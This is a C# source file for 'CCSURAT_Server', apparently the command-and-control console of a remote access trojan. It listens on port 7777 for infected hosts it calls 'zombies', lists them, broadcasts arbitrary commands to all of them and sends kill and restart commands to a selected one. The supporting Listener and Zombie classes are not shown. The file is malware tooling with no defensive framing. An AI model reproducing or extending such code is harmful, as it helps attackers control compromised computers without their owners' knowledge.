using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public partial class ServerMainForm : Form
    {
        // Port that we will listen to connection on.
        private static int listenPort = 7777;

        private Listener listener;

        // Store active connection in a list
        private List<Zombie> zombies = new List<Zombie>();
        private ListViewHitTestInfo selected;
        public ServerMainForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // start the connection listener on port, pass current zombies list
            listener = new Listener(this, zombies, listenPort);
            Thread thread = new Thread(new ThreadStart(listener.Listen));
            thread.Start();
        }

        private void sendButton_Click(object sender, EventArgs e)
        {
            // send data to all zombies.
            foreach(Zombie z in zombies)
            {
                z.SendData(cmdTextbox.Text);
            }
        }

        public void Log(string s)
        {
            // this is needed for any method on the main form called from the zombie thread.
            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(Log), new object[] { s });
                return;
            }

            // appends log data to the console, including time of logging
            console.AppendText("[ " + string.Format("{0:hh:mm:ss tt}", DateTime.Now) + " ] " + s + "\n");
            console.ScrollToCaret();
        }

        private void zombieListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = zombieListView.HitTest(e.X, e.Y);
                if (selected.Item != null)
                {
                    clientControl.Show(zombieListView, e.Location);
                }
                else
                {
                }
            }
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelected("[[KILL]][[/KILL]]");
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendSelected("[[RESTART]][[/RESTART]]");
        }

        private void SendSelected(string s)
        {
            ((ZombieListItem)selected.Item).zombieClient.SendData(s);
        }
    }

    // custom listitem that contains the zombie client object
    public class ZombieListItem : ListViewItem
    {
        private Zombie zombie;
        public Zombie zombieClient
        {
            get { return zombie; }
            set { zombie = value; }
        }
        public ZombieListItem(Zombie z) : base()
        {
            zombie = z;
        }
    }
}
